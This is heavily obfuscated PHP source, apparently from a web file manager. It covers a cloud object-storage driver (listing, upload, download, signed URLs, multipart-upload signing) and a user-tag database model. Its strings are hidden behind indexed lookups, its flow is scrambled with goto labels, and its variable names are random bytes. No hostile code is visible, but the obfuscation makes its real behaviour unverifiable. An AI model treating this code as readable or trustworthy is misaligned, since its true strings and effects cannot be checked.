eæÛ¼‹í¢‘: } private function folderInfo($c¥÷¹ø–­ª, $A§œ ½ƒã† = false) { goto Dì›ôÄõå‘; f©‰…ÑÚ: if (isset($aŠÍ–ÉÛ£ô[$D¥´¶Ïé¸Ó[190]])) { $DÃÛæÃŸ»Š[$D¥´¶Ïé¸Ó[187]] = $aŠÍ–ÉÛ£ô[$D¥´¶Ïé¸Ó[190]]; } return $DÃÛæÃŸ»Š; goto aâô®µä§•; AÅâÃÁ“š‚: if ($c¥÷¹ø–­ª == $D¥´¶Ïé¸Ó[33]) { return $DÃÛæÃŸ»Š; } $c¥÷¹ø–­ª = trim($c¥÷¹ø–­ª, $D¥´¶Ïé¸Ó[8]) . $D¥´¶Ïé¸Ó[8]; $aŠÍ–ÉÛ£ô = $this->objectMeta($c¥÷¹ø–­ª); goto f©‰…ÑÚ; Dì›ôÄõå‘: $D¥´¶Ïé¸Ó =& $_SERVER[ã®Â„Éæ¹¤]; if ($A§œ ½ƒã†) { return array($D¥´¶Ïé¸Ó[28] => $this->pathThis($c¥÷¹ø–­ª), $D¥´¶Ïé¸Ó[75] => $this->getPathOuter($D¥´¶Ïé¸Ó[8] . $c¥÷¹ø–­ª), $D¥´¶Ïé¸Ó[29] => $D¥´¶Ïé¸Ó[76], $D¥´¶Ïé¸Ó[188] => !0, $D¥´¶Ïé¸Ó[189] => !0); } $DÃÛæÃŸ»Š = array($D¥´¶Ïé¸Ó[28] => $this->pathThis($c¥÷¹ø–­ª), $D¥´¶Ïé¸Ó[75] => $this->getPathOuter($D¥´¶Ïé¸Ó[8] . $c¥÷¹ø–­ª), $D¥´¶Ïé¸Ó[29] => $D¥´¶Ïé¸Ó[76], $D¥´¶Ïé¸Ó[187] => 0, $D¥´¶Ïé¸Ó[107] => 0, $D¥´¶Ïé¸Ó[188] => !0, $D¥´¶Ïé¸Ó[189] => !0); goto AÅâÃÁ“š‚; aâô®µä§•: } public function listObjs($eÖ‚•¨‚øÈ, $E…ïµÊ„Í‹ = null, $c¼¢”‹“©¸ = null, $a‰¿°ËÉö¦ = null) { $CğÚ‘ˆ¾¸ê =& $_SERVER[ã®Â„Éæ¹¤]; $eÖ‚•¨‚øÈ = trim($eÖ‚•¨‚øÈ, $CğÚ‘ˆ¾¸ê[8]); $B¢•İÈ„Â¸ = empty($eÖ‚•¨‚øÈ) ? $CğÚ‘ˆ¾¸ê[33] : $eÖ‚•¨‚øÈ . $CğÚ‘ˆ¾¸ê[8]; return $this->client->getBucket($this->bucket, $B¢•İÈ„Â¸, $E…ïµÊ„Í‹, $c¼¢”‹“©¸, $a‰¿°ËÉö¦, !0); } public function has($A°Òé´ø°Ö, $B×ˆçßÈõ‡ = false, $fŞÀÀåëŸ = true) { goto bá®ÏªÌö; E‡á’»°¯Õ: if ($B×ˆçßÈõ‡) { return array($Aá˜ñİ–ï–[191] => $CÌäø•…Ÿº, $Aá˜ñİ–ï–[192] => $b©‹…óİ‚); } return !1; goto aØŒƒÌÚ×¸; c–™Ë°¾•: $f„ÃÕ’Õ³Ç = $this->listObjs($A°Òé´ø°Ö, null, null, $Aá˜ñİ–ï–[8]); $f„ÃÕ’Õ³Ç = is_array($f„ÃÕ’Õ³Ç) ? $f„ÃÕ’Õ³Ç : array(); foreach ($f„ÃÕ’Õ³Ç as $EæÇó©éé¼) { if (isset($EæÇó©éé¼[$Aá˜ñİ–ï–[28]]) && substr($EæÇó©éé¼[$Aá˜ñİ–ï–[28]], -1) != $Aá˜ñİ–ï–[8]) { if (!$B×ˆçßÈõ‡ && $fŞÀÀåëŸ) { return !0; } $CÌäø•…Ÿº++; } else { if (isset($EæÇó©éé¼[$Aá˜ñİ–ï–[186]])) { if (!$B×ˆçßÈõ‡ && !$fŞÀÀåëŸ) { return !1; } $b©‹…óİ‚++; } } } goto E‡á’»°¯Õ; bá®ÏªÌö: $Aá˜ñİ–ï– =& $_SERVER[ã®Â„Éæ¹¤]; $CÌäø•…Ÿº = 0; $b©‹…óİ‚ = 0; goto c–™Ë°¾•; aØŒƒÌÚ×¸: } public function listAll($CÇŠ«¦œèÊ) { $FŞÖŠÔêàÛ =& $_SERVER[ã®Â„Éæ¹¤]; $F‚öÛ¾¨È¹ = $this->listObjs($CÇŠ«¦œèÊ); $Cƒ‹çİ¿Ö = $eˆùÎè¶øÕ = array(); foreach ($F‚öÛ¾¨È¹ as $Dîìƒ¿‹†‚ => $c´¡ì¡¶ç) { $Cƒ‹çİ¿Ö[] = $c´¡ì¡¶ç[$FŞÖŠÔêàÛ[28]]; $eˆùÎè¶øÕ[$Dîìƒ¿‹†‚] = $c´¡ì¡¶ç[$FŞÖŠÔêàÛ[77]]; } return $this->listAllFiles($CÇŠ«¦œèÊ, $Cƒ‹çİ¿Ö, $eˆùÎè¶øÕ); } public function canRead($a«³µìÌ›æ) { $cÚ¦—ÄÜš =& $_SERVER[ã®Â„Éæ¹¤]; $BÚÇâõÀß² = $this->client->getAccessControlPolicy($this->bucket, $a«³µìÌ›æ); if (!$BÚÇâõÀß²) { return !1; } return in_array($BÚÇâõÀß², array($cÚ¦—ÄÜš[193], $cÚ¦—ÄÜš[194], $cÚ¦—ÄÜš[195])) ? !0 : !1; } public function canWrite($E¦Éˆ¤¥•Ì) { $d¸ß¶×¢Õ =& $_SERVER[ã®Â„Éæ¹¤]; $AÎÄéÀÌ¢ = $this->client->getAccessControlPolicy($this->bucket, $E¦Éˆ¤¥•Ì); if (!$AÎÄéÀÌ¢) { return !1; } return in_array($AÎÄéÀÌ¢, array($d¸ß¶×¢Õ[193], $d¸ß¶×¢Õ[194])) ? !0 : !1; } public function getContent($a±ŒšñÃĞÍ) { return $this->client->getObject($this->bucket, $a±ŒšñÃĞÍ); } public function setContent($Cï„ìõİ¶À, $c»š—½ÄÅ¬ = '', $F‘•‹Ì†¹ = false) { goto D¹†ÃÛØ; D¹†ÃÛØ: $D§èï†Ã…ï =& $_SERVER[ã®Â„Éæ¹¤]; $Cï„ìõİ¶À = $F‘•‹Ì†¹ ? trim($Cï„ìõİ¶À, $D§èï†Ã…ï[8]) . $D§èï†Ã…ï[8] : $Cï„ìõİ¶À; $fèµİ‡¦Ä¯ = get_file_mime(get_path_ext($Cï„ìõİ¶À)); goto BĞ»íÏÆ©Ş; aË¡¹ğ¯‹Ä: $this->cacheMethod(null, null); $B…¬Ù™¼× = $this->copyFile($Cï„ìõİ¶À, $Cï„ìõİ¶À, array($D§èï†Ã…ï[196] => $B…¬Ù™¼×[$D§èï†Ã…ï[197]])); return $B…¬Ù™¼× ? !0 : !1; goto AÂãÙİç‘ì; BĞ»íÏÆ©Ş: $B…¬Ù™¼× = $this->client->putObject($c»š—½ÄÅ¬, $this->bucket, $Cï„ìõİ¶À, $D§èï†Ã…ï[185], array(), $fèµİ‡¦Ä¯); if (!$B…¬Ù™¼×) { return !1; } if ($F‘•‹Ì†¹) { return !0; } goto aË¡¹ğ¯‹Ä; AÂãÙİç‘ì: } public function fileSubstr($c½íêåë„‘, $cƒåÓš ”ƒ, $dÇïËäù¿) { $bÔ¬´æÚ£¯ = $cƒåÓš ”ƒ + $dÇïËäù¿ - 1; return $this->client->getObject($this->bucket, $c½íêåë„‘, array($_SERVER[ã®Â„Éæ¹¤][198] => "\x62\171\164\145\163\x3d{$cƒåÓš ”ƒ}\55{$bÔ¬´æÚ£¯}")); } public function upload($Bàë´›ò, $A¼îÆè“¥Ò, $fõ õ«×´ó = false, $cÂ—¶ÛÕ±† = REPEAT_REPLACE) { $fÇÙ‹¼¨¤È =& $_SERVER[ã®Â„Éæ¹¤]; $B£¨µŠî÷Ÿ = array($fÇÙ‹¼¨¤È[196] => @md5_file($A¼îÆè“¥Ò)); $Eç•âÂš = array($fÇÙ‹¼¨¤È[199] => get_file_mime(get_path_ext($Bàë´›ò))); if (IO::size($A¼îÆè“¥Ò) <= 1024 * 1024 * 200) { $E’Éî’šø = $this->client->putObjectFile($A¼îÆè“¥Ò, $this->bucket, $Bàë´›ò, $fÇÙ‹¼¨¤È[185], $B£¨µŠî÷Ÿ, $Eç•âÂš); return !empty($E’Éî’šø) ? $this->getPathOuter($Bàë´›ò) : !1; } $fÃé³•êŒÓ = $this->client->multiUploadObject($A¼îÆè“¥Ò, $this->bucket, trim($Bàë´›ò, $fÇÙ‹¼¨¤È[8]), $B£¨µŠî÷Ÿ, $Eç•âÂš); return $fÃé³•êŒÓ ? $this->getPathOuter($Bàë´›ò) : !1; } public function download($B´Äƒ¦Ë°Ê, $c‘Ç¹¨Å¡Ç) { if (!@is_dir($this->pathFather($c‘Ç¹¨Å¡Ç)) && !IO::mkdir($this->pathFather($c‘Ç¹¨Å¡Ç))) { return !1; } $Eò¤ˆÎ§ë = $this->client->getObject($this->bucket, $B´Äƒ¦Ë°Ê, array(), $c‘Ç¹¨Å¡Ç); return $Eò¤ˆÎ§ë !== !1 ? $c‘Ç¹¨Å¡Ç : !1; } public function link($F¹¹ÄËÌƒ‡, $bŠ‹Ì÷ŞŠ = array()) { $EÏñ¿•³” =& $_SERVER[ã®Â„Éæ¹¤]; if ($this->signVer == $EÏñ¿•³”[200]) { return $this->client->getAuthenticatedURL($this->bucket, $F¹¹ÄËÌƒ‡, 3600 * 12, $bŠ‹Ì÷ŞŠ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($F¹¹ÄËÌƒ‡, $EÏñ¿•³”[8]), 3600 * 12, $this->region, array(), !0, $bŠ‹Ì÷ŞŠ); } public function fileOut($f›½Ñ”ÊÂ, $E²±¥É‡¦æ = false, $D±¾—‚…ôà = false, $CÙ‹ ¾Ö¬ = '') { goto e±‡ŞĞ²‡·; FÛ¥¤ÅéÛ†: $F¨™í›¶– = get_file_mime(get_path_ext($D±¾—‚…ôà)); if ($F¨™í›¶– == $E¹áêâÕ›—[201]) { return parent::fileOut($f›½Ñ”ÊÂ, $E²±¥É‡¦æ, $D±¾—‚…ôà, $CÙ‹ ¾Ö¬); } $E²±¥É‡¦æ = $E²±¥É‡¦æ ? $E¹áêâÕ›—[202] : $E¹áêâÕ›—[203]; goto E¹Â»÷•ä‘; E¹Â»÷•ä‘: $BÔŒì‘ùé = array($E¹áêâÕ›—[204] => $E²±¥É‡¦æ . $E¹áêâÕ›—[205] . rawurlencode($D±¾—‚…ôà), $E¹áêâÕ›—[206] => $F¨™í›¶–); $d“‰ŒÌö­µ = $this->link($f›½Ñ”ÊÂ, $BÔŒì‘ùé); $this->fileOutLink($d“‰ŒÌö­µ); goto aôÈêˆˆà; e±‡ŞĞ²‡·: $E¹áêâÕ›— =& $_SERVER[ã®Â„Éæ¹¤]; if ($this->isFileOutServer()) { return $this->fileOutServer($f›½Ñ”ÊÂ, $E²±¥É‡¦æ, $D±¾—‚…ôà, $CÙ‹ ¾Ö¬); } if (!$D±¾—‚…ôà) { $D±¾—‚…ôà = $this->pathThis($f›½Ñ”ÊÂ); } goto FÛ¥¤ÅéÛ†; aôÈêˆˆà: } public function fileOutServer($CĞÇ¦ò, $EÙ‹ï˜İñ× = false, $Eë«ù¯‡à = false, $Aò’ÈË»¤„ = '') { parent::fileOut($CĞÇ¦ò, $EÙ‹ï˜İñ×, $Eë«ù¯‡à, $Aò’ÈË»¤„); } public function fileOutImageServer($a‰¬‰çã­, $dÒÀ˜êÍ¨Ì = 250) { parent::fileOutImage($a‰¬‰çã­, $dÒÀ˜êÍ¨Ì); } public function hashMd5($e’í¾©™‘Á, $dÃ‰åÚÊÙë = '') { $Bà¥Õôó÷’ =& $_SERVER[ã®Â„Éæ¹¤]; $f¶™ÄÒŠ½² = $this->objectMeta($e’í¾©™‘Á); if (!$f¶™ÄÒŠ½²) { return !1; } $dÃ‰åÚÊÙë = $dÃ‰åÚÊÙë ? $dÃ‰åÚÊÙë : _get($f¶™ÄÒŠ½², $Bà¥Õôó÷’[207]); $dÃ‰åÚÊÙë = $dÃ‰åÚÊÙë ? $dÃ‰åÚÊÙë : _get($f¶™ÄÒŠ½², $Bà¥Õôó÷’[197], $Bà¥Õôó÷’[33]); return $dÃ‰åÚÊÙë; } public function uploadFormData($EÈÃšÕåªÜ, $c‹§¢éÇª = 3600) { $aôóìù¸ =& $_SERVER[ã®Â„Éæ¹¤]; $C—ª›‡‚ì = $this->pathFather($EÈÃšÕåªÜ); $eâŠõ”Ú–× = $this->client->getHttpUploadPostParams($this->bucket, $C—ª›‡‚ì, $aôóìù¸[185], $c‹§¢éÇª); return array_merge((array) $eâŠõ”Ú–×, array($aôóìù¸[169] => $this->getHost())); } public function multiUploadFormData($e±±õ™“¥, $dÒšå¸ƒ³® = 3600) { $e¡”®’Àğß =& $_SERVER[ã®Â„Éæ¹¤]; $EÀô†–ªé = gmdate($e¡”®’Àğß[208]); $F§©ÖÌ„ñ‰ = array(); $aÛ¨ëßÈ»… = $this->client->getUploadId($this->bucket, $e±±õ™“¥, $F§©ÖÌ„ñ‰); if (!$aÛ¨ëßÈ»…) { return !1; } return array($e¡”®’Àğß[209] => $aÛ¨ëßÈ»…, $e¡”®’Àğß[169] => $this->getHost() . $e¡”®’Àğß[8] . $this->pathEncode($e±±õ™“¥), $e¡”®’Àğß[210] => $EÀô†–ªé, $e¡”®’Àğß[89] => $e±±õ™“¥); } public function multiUploadAuthData($E‚¬å•ì¥Ä, $aÔ³çô±°­ = array()) { goto e½ª‹Ô¿; AâÌî±×: if (strpos($B·†¬ÑğŸ, $Dô™”à¦¯Š[213]) === 0) { return array($Dô™”à¦¯Š[220] => $F¢£ÆÁËâ¨, $Dô™”à¦¯Š[210] => $BËƒ†®ã«÷); } return $F¢£ÆÁËâ¨; goto A«ó•ÇÄî; Cœ­ŸŠ·ï½: $A¨­ĞÀÊ§Õ = $aÔ³çô±°­[$Dô™”à¦¯Š[89]]; unset($aÔ³çô±°­[$Dô™”à¦¯Š[89]]); if (isset($aÔ³çô±°­[$Dô™”à¦¯Š[211]])) { $aÔ³çô±°­[$Dô™”à¦¯Š[210]] = $BËƒ†®ã«÷; return $this->listUploadParts($A¨­ĞÀÊ§Õ, $aÔ³çô±°­); } goto A·¦Ù®êÁ; A·¦Ù®êÁ: $E»‡ëæïáÒ = array($Dô™”à¦¯Š[212], $Dô™”à¦¯Š[33], $Dô™”à¦¯Š[116], $Dô™”à¦¯Š[33], "\x78\x2d\141\155\172\55\144\141\164\145\x3a{$BËƒ†®ã«÷}", $Dô™”à¦¯Š[8] . $this->bucket . $Dô™”à¦¯Š[8] . $this->pathEncode($A¨­ĞÀÊ§Õ) . $B·†¬ÑğŸ); if (strpos($B·†¬ÑğŸ, $Dô™”à¦¯Š[213]) === 0) { $E»‡ëæïáÒ[0] = $Dô™”à¦¯Š[214]; } if (isset($aÔ³çô±°­[$Dô™”à¦¯Š[215]]) && $aÔ³çô±°­[$Dô™”à¦¯Š[215]] == $Dô™”à¦¯Š[216]) { $E»‡ëæïáÒ[0] = $Dô™”à¦¯Š[216]; } goto dîªÃé²¶; e½ª‹Ô¿: $Dô™”à¦¯Š =& $_SERVER[ã®Â„Éæ¹¤]; $BËƒ†®ã«÷ = isset($aÔ³çô±°­[$Dô™”à¦¯Š[210]]) ? $aÔ³çô±°­[$Dô™”à¦¯Š[210]] : gmdate($Dô™”à¦¯Š[208]); $B·†¬ÑğŸ = isset($aÔ³çô±°­[$Dô™”à¦¯Š[160]]) ? $aÔ³çô±°­[$Dô™”à¦¯Š[160]] : $Dô™”à¦¯Š[33]; goto Cœ­ŸŠ·ï½; dîªÃé²¶: $C„»ë™ºÒÆ = implode($Dô™”à¦¯Š[217], $E»‡ëæïáÒ); $AÃ¸•–İ”Œ = base64_encode(hash_hmac($Dô™”à¦¯Š[218], $C„»ë™ºÒÆ, $this->secret, !0)); $F¢£ÆÁËâ¨ = $Dô™”à¦¯Š[219] . $this->accessKey . $Dô™”à¦¯Š[4] . $AÃ¸•–İ”Œ; goto AâÌî±×; A«ó•ÇÄî: } public function listUploadParts($côÀ¨©ÄÙ, $eóÆ»˜³Ã = array()) { goto e•—­•ÚÄ±; BÑêŒì¡ÊŸ: if (!$cåà³×¡á¼) { return !1; } unset($eóÆ»˜³Ã[$FÀÈÀèä[211]], $eóÆ»˜³Ã[$FÀÈÀèä[215]]); $eóÆ»˜³Ã[$FÀÈÀèä[89]] = $côÀ¨©ÄÙ; goto BÕŠó¹½²É; BÕŠó¹½²É: $aåÙ»Èæ“ = $this->multiUploadAuthData($côÀ¨©ÄÙ, $eóÆ»˜³Ã); if (empty($aåÙ»Èæ“)) { return !1; } return array($FÀÈÀèä[220] => $aåÙ»Èæ“, $FÀÈÀèä[210] => $eóÆ»˜³Ã[$FÀÈÀèä[210]], $FÀÈÀèä[222] => $cåà³×¡á¼); goto båìéÙÊã; e•—­•ÚÄ±: $FÀÈÀèä =& $_SERVER[ã®Â„Éæ¹¤]; $Cš‰È«ëğâ = str_replace($FÀÈÀèä[221], $FÀÈÀèä[33], $eóÆ»˜³Ã[$FÀÈÀèä[160]]); $cåà³×¡á¼ = $this->client->listParts($this->bucket, $côÀ¨©ÄÙ, $Cš‰È«ëğâ); goto BÑêŒì¡ÊŸ; båìéÙÊã: } public function getHost() { return parent::getHost() . $_SERVER[ã®Â„Éæ¹¤][8] . $this->bucket; } public function size($e½ÁÑ°ÎÇ¹) { $Aø‹óÁÀ±ï = $this->objectMeta($e½ÁÑ°ÎÇ¹); return $Aø‹óÁÀ±ï ? $Aø‹óÁÀ±ï[$_SERVER[ã®Â„Éæ¹¤][77]] : 0; } public function info($cƒ”ŠŒ°Ñ§) { if ($this->isFolder($cƒ”ŠŒ°Ñ§)) { return $this->folderInfo($cƒ”ŠŒ°Ñ§); } else { if ($this->isFile($cƒ”ŠŒ°Ñ§)) { return $this->fileInfo($cƒ”ŠŒ°Ñ§); } } return !1; } public function exist($a§²¸”±) { return $this->isFile($a§²¸”±) || $this->isFolder($a§²¸”±); } public function isFile($c„Îâ×—»Ä) { return !$this->isFolder($c„Îâ×—»Ä) && $this->objectMeta($c„Îâ×—»Ä); } public function isFolder($CŠ°ãï¯â) { return $this->cacheMethod($_SERVER[ã®Â„Éæ¹¤][223], $CŠ°ãï¯â); } protected function objectMeta($Cäİİ¶è×) { return $this->cacheMethod($_SERVER[ã®Â„Éæ¹¤][224], $Cäİİ¶è×); } protected function _objectMeta($F­¦£ÄÁ) { $E·¤Ÿ•¿Íó =& $_SERVER[ã®Â„Éæ¹¤]; $F­¦£ÄÁ = rtrim($F­¦£ÄÁ, $E·¤Ÿ•¿Íó[8]); try { $aÊÂ˜çÃ = $this->client->getObjectInfo($this->bucket, $F­¦£ÄÁ); if (!isset($aÊÂ˜çÃ[$E·¤Ÿ•¿Íó[207]]) && isset($aÊÂ˜çÃ[$E·¤Ÿ•¿Íó[225]])) { $aÊÂ˜çÃ[$E·¤Ÿ•¿Íó[207]] = $aÊÂ˜çÃ[$E·¤Ÿ•¿Íó[225]]; } } catch (Exception $B½ËâÄï’) { $aÊÂ˜çÃ = !1; } if (!$aÊÂ˜çÃ) { } return $aÊÂ˜çÃ; } protected function _isFolder($bİ‡ëè») { goto aç‘ø™‡İ×; Aß’µ÷¦‹: if (substr($E‚á§›[0][$d…ä§àóßÆ[28]], -1) == $d…ä§àóßÆ[8]) { return !0; } if (get_path_this($E‚á§›[0][$d…ä§àóßÆ[28]]) == get_path_this($bİ‡ëè»)) { return !1; } return !0; goto DĞÉÒ©¹¬°; F²Æ°øå´ô: $E‚á§› = $this->client->getBucket($this->bucket, $bİ‡ëè», null, 1); if (empty($E‚á§›)) { return !1; } $E‚á§› = array_values($E‚á§›); goto Aß’µ÷¦‹; aç‘ø™‡İ×: $d…ä§àóßÆ =& $_SERVER[ã®Â„Éæ¹¤]; $bİ‡ëè» = rtrim($bİ‡ëè», $d…ä§àóßÆ[8]); if ($bİ‡ëè» == $d…ä§àóßÆ[33] || $bİ‡ëè» == $d…ä§àóßÆ[8]) { return !0; } goto F²Æ°øå´ô; DĞÉÒ©¹¬°: } } define($_SERVER[ã®Â„Éæ¹¤][226], 1); goto CÊœö†‡ñ†; EùÄÃ÷Ò«: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($c³¡ƒñá¯) { $cò’¥ß¦Ÿ =& $_SERVER[ã®Â„Éæ¹¤]; return array($cò’¥ß¦Ÿ[2223] => array(USER_ID, $cò’¥ß¦Ÿ[2224])); } protected function listData() { $cÛÑšàÖÂ =& $_SERVER[ã®Â„Éæ¹¤]; $aâĞ¦É™¶ = array($cÛÑšàÖÂ[1447] => USER_ID, $cÛÑšàÖÂ[436] => array($cÛÑšàÖÂ[2227], 0)); $F‰™«Û³§à = $cÛÑšàÖÂ[2229]; $BØğøøÒâë = $this->field($F‰™«Û³§à)->where($aâĞ¦É™¶)->order($cÛÑšàÖÂ[2230])->select(); return $BØğøøÒâë ? $BØğøøÒâë : array(); } protected function listByTag($Eøì‰íß‡¸) { } protected function addToTag($bó÷¹¿ÔŞò, $A£¥óÎ‹Œ‰) { $e”£ŠÜÏ·¼ =& $_SERVER[ã®Â„Éæ¹¤]; if (!Model($e”£ŠÜÏ·¼[2365])->listData($A£¥óÎ‹Œ‰) || !Model($e”£ŠÜÏ·¼[775])->pathInfo($bó÷¹¿ÔŞò)) { return !1; } $Cª´ŒªŒ’ = array($e”£ŠÜÏ·¼[1447] => USER_ID, $e”£ŠÜÏ·¼[436] => $A£¥óÎ‹Œ‰, $e”£ŠÜÏ·¼[387] => $bó÷¹¿ÔŞò, $e”£ŠÜÏ·¼[388] => $e”£ŠÜÏ·¼[382], $e”£ŠÜÏ·¼[386] => $e”£ŠÜÏ·¼[33], $e”£ŠÜÏ·¼[2131] => 0); if ($this->where($Cª´ŒªŒ’)->find()) { return !1; } return $this->add($Cª´ŒªŒ’); } protected function removeFromTag($CäšÉ—Š, $fÖ®ö²é¶‰) { $c½âä…ŒŒê =& $_SERVER[ã®Â„Éæ¹¤]; if (!Model($c½âä…ŒŒê[2365])->listData($fÖ®ö²é¶‰)) { return !1; } if (is_array($CäšÉ—Š)) { $CäšÉ—Š = array($c½âä…ŒŒê[7], $CäšÉ—Š); } $dÚšæï‚ğ¬ = array($c½âä…ŒŒê[1447] => USER_ID, $c½âä…ŒŒê[436] => $fÖ®ö²é¶‰, $c½âä…ŒŒê[388] => $c½âä…ŒŒê[382], $c½âä…ŒŒê[387] => $CäšÉ—Š); return $this->where($dÚšæï‚ğ¬)->delete(); } protected function removeByTag($Fø¢·ŠöÈ•) { $c²ô“¾Ï‚ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$Fø¢·ŠöÈ•) { return !1; } $DÑÄÜ¨®âà = array($c²ô“¾Ï‚[1447] => USER_ID, $c²ô“¾Ï‚[436] => $Fø¢·ŠöÈ•); return $this->where($DÑÄÜ¨®âà)->delete(); } protected function removeBySource($FàùÔº“Ú) { $fÁ÷‰†óë× =& $_SERVER[ã®Â„Éæ¹¤]; if (is_array($FàùÔº“Ú)) { $FàùÔº“Ú = array($fÁ÷‰†óë×[7], $FàùÔº“Ú); } $cô¬æôâ‚á = array($fÁ÷‰†óë×[1447] => USER_ID, $fÁ÷‰†óë×[387] => $FàùÔº“Ú, $fÁ÷‰†óë×[436] => array($fÁ÷‰†óë×[946], 0)); return $this->where($cô¬æôâ‚á)->delete(); } }